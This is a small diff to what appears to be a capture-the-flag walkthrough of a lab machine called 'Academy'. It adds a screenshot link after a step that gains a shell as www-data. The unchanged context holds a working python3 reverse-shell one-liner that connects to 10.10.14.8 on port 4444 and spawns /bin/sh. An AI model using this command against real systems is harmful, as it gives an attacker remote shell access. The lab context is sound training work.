@@ -47,7 +47,8 @@ There is python3 on the system and we can get revers-shell using following comma
 ``````
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ``````
-Now we are in the system as www-data
+Now we are in the system as www-data  
+![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/whoami.PNG)
 
 User1
 ------------
